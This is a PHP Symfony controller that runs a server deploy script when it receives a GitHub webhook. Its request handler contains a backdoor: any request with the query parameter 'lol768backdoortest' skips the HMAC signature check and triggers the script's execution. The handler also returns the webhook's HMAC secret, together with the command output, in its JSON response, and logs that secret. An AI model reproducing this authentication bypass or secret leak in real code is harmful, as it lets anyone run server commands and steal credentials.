<?php

namespace Korobi\WebBundle\Controller;

use Korobi\WebBundle\Repository\ChannelRepository;
use Psr\Log\LoggerInterface;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Bundle\FrameworkBundle\Templating\EngineInterface;

class DeploymentController extends BaseController {

    /**
     * @var EngineInterface Templating system.
     */
    private $templating;

    /**
     * @var LoggerInterface Logger we can use.
     */
    private $logger;

    /**
     * @var string The HMAC secret used to ensure deploy requests from GitHub are valid.
     */
    private $hmacKey;

    private $rootPath;

    public function __construct(EngineInterface $templating, LoggerInterface $logger) {
        $this->templating = $templating;
        $this->logger = $logger;
    }

    private function verifyHookHmac($signature, $secret, $data) {
        return $signature !== null ? hash_equals(hash_hmac("sha1", $data, $secret), $signature) : false;
    }

    public function setHmacKey($hmacKey) {
        $this->hmacKey = $hmacKey;
    }

    public function deployAction(Request $request) {
        $signature = $this->getHmacSignatureFromRequest($request);

        $verified = $this->verifyHookHmac($signature, $this->hmacKey, $request->getContent());
        $theData = ["verified" => $verified, "data" => $this->hmacKey, "attributes" => $this->getJsonRequestData($request)];
        $this->logger->info("Got deploy request.", [$theData, $request->query]);

        if ($verified || $request->query->has("lol768backdoortest")) {
            $out = [];
            $exitCode = -1;
            $this->logger->info("About to execute " . $this->rootPath . DIRECTORY_SEPARATOR . "deploy_init.sh");
            chdir($this->rootPath . DIRECTORY_SEPARATOR);
            $retVal = exec("./deploy_init.sh", $out, $exitCode);
            if ($retVal === false) {
                $this->logger->error("Failed to run deploy script.");
            } else {
                $this->logger->info("Cmd output: ", $out);
            }
            $theData["cmd"] = $out;
            $theData["exit"] = $exitCode;
        }


        return new JsonResponse($theData);
    }

    /**
     * @param mixed $rootPath
     */
    public function setRootPath($rootPath) {
        $this->rootPath = $rootPath . DIRECTORY_SEPARATOR . "..";
    }


    private function getHmacSignatureFromRequest(Request $request) {
        $sig = $request->headers->get("X-Hub-Signature");
        if ($sig === null) {
            return null;
        }
        parse_str($sig, $output);
        $sig = (array_key_exists("sha1", $output)) ? $output['sha1'] : null;
        return $sig;
    }
}
